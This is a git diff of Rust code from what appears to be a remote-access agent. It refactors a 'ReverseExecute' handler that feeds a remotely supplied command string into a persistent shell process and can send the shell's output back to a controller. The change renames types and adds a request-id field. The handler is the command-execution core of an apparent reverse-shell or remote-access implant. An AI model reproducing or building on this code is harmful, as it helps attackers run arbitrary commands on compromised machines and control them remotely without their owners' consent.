@@ -11,8 +11,8 @@ use serde::{Serialize, Deserialize};
 
 use common::{
     registry::{
-        handle::Handleable,
-        krousinator_interface::KrousinatorInterface,
+        Handleable,
+        Context,
     },
 };
 
@@ -23,7 +23,8 @@ use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
 #[derive(Debug, Serialize)]
 pub struct ReverseExecuteSend {
-    _t: &'static str,
+    _t: String,
+    manual_request_id: Option<Uuid>,
     pub successful: bool,
     pub uuid: Uuid,
     pub response: Option<String> 
@@ -31,10 +32,11 @@ pub struct ReverseExecuteSend {
 
 #[derive(Deserialize, Debug)]
 #[register_handler]
-pub struct ReverseExecuteReq {
+pub struct ReverseExecuteRecv {
     _t: String,
     payload: String, // full command
-    payload_response: bool // to send back the shells output or not
+    payload_response: bool, // to send back the shells output or not
+    manual_request_id: Option<Uuid>
 }
 
 
@@ -52,9 +54,9 @@ static SHELL: Lazy<Mutex<Child>> = Lazy::new(|| {
 
 
 #[async_trait]
-impl Handleable for ReverseExecuteReq {
+impl Handleable for ReverseExecuteRecv {
     
-    async fn handle(&self, ctx: &mut KrousinatorInterface) {
+    async fn handle(&self, ctx: &mut Context) {
         let mut shell = SHELL.lock().await;
         let stdin = shell.stdin.as_mut().unwrap();
     
@@ -87,7 +89,8 @@ impl Handleable for ReverseExecuteReq {
         };
 
         ctx.send(ReverseExecuteSend {
-            _t: "ReverseExecuteSend",
+            _t: "ReverseExecuteSend".to_string(),
+            manual_request_id: self.manual_request_id,
             successful: exit_code == 0,
             uuid: ctx.get_uuid(),
             response: if self.payload_response {
